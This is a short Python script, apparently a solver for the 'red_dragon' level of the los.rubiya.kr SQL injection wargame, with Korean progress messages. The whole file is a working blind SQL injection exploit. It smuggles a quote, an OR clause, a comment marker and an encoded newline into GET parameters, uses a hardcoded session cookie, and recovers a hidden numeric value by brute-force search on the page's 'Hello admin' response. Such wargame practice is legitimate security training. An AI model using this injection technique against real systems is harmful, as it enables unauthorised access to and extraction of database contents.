import requests

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?"
cookie = {'PHPSESSID':'ambh3t3mecidd3th3qah8m5flj'}

def no_length():
    no_len = 0
    length = "1"
    while True:
        length += "0"
        query = "id=%27||no<%23&no=%0a{}".format(length)
        res = requests.get(url=url+query, cookies=cookie)
        if "Hello admin" in res.text:
            no_len = len(length)-1
            print("no는 {} 자리입니다.".format(no_len))
            break
    return no_len

def find_no(no_len):
    no = 0
    for i in range(1, no_len+2):
        for j in range(no,10**no_len,pow(10,10-i)):
            query = "id=%27||no<%23&no=%0a{}".format(j)
            res = requests.get(url=url+query, cookies=cookie)
            if "Hello admin" in res.text:
                no = j - pow(10,10-i)
                print("{} 번째 숫자 발견".format(i-1))
                break
    print("no : " + str(no))

if __name__ == "__main__":
    no_len = no_length()
    find_no(no_len)
